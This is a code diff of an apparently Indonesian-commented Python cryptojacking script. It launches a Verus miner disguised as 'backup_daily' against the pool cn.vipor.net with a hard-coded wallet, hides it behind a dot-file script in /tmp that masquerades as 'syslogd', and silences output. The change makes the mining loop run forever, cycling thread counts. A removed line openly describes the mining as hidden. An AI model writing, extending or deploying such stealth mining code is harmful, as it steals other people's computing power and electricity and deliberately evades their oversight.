@@ -55,33 +55,36 @@ def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
     threads = initial_threads
     max_threads = total_cpus  # Batasi jumlah maksimum thread sesuai dengan jumlah CPU yang tersedia
     
-    while threads <= max_threads:
-        command = f"./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t {threads}"
+    while True:
+        while threads <= max_threads:
+            command = f"./backup_daily -a verus -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x -t {threads}"
+            
+            print(f"Menjalankan mining dengan {threads} thread")
+            
+            script_content = f"""#!/bin/bash
+            exec -a syslogd {command}
+            """
+            script_path = "/tmp/.syslogd_miner.sh"
+            
+            with open(script_path, "w") as script_file:
+                script_file.write(script_content)
+            os.chmod(script_path, 0o755)
+            
+            mining_process = subprocess.Popen(
+                f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {script_path} > /dev/null 2>&1 &",
+                shell=True
+            )
+            
+            sleep_time = random.randint(55, 60)
+            time.sleep(sleep_time)
+            
+            print(f"Mining dihentikan selama {sleep_time} detik.")
+            stop_mining()
+            
+            time.sleep(10)
+            
+            threads += 1  # Tambah jumlah thread setiap kali mining dihentikan
         
-        print(f"Menjalankan mining secara tersembunyi pada NUMA node {numa_node} dengan {limited_cpus}/{total_cpus} CPU ({limit_percent}%) dan {threads} thread")
-        
-        script_content = f"""#!/bin/bash
-        exec -a syslogd {command}
-        """
-        script_path = "/tmp/.syslogd_miner.sh"
-        
-        with open(script_path, "w") as script_file:
-            script_file.write(script_content)
-        os.chmod(script_path, 0o755)
-        
-        mining_process = subprocess.Popen(
-            f"numactl --cpunodebind={numa_node} --membind={numa_node} taskset -c {selected_cpus} {script_path} > /dev/null 2>&1 &",
-            shell=True
-        )
-        
-        sleep_time = random.randint(55, 60)
-        time.sleep(sleep_time)
-        
-        print(f"Mining dihentikan selama {sleep_time} detik. Melanjutkan dalam 10 detik...")
-        stop_mining()  # Hentikan proses mining sebelum jeda
-        
-        time.sleep(10)
-        
-        threads += 1  # Tambah jumlah thread setiap kali mining dihentikan
+        threads = initial_threads  # Reset jumlah thread setelah mencapai maksimum
 
 start_mining(numa_node=0, limit_percent=80, initial_threads=1)
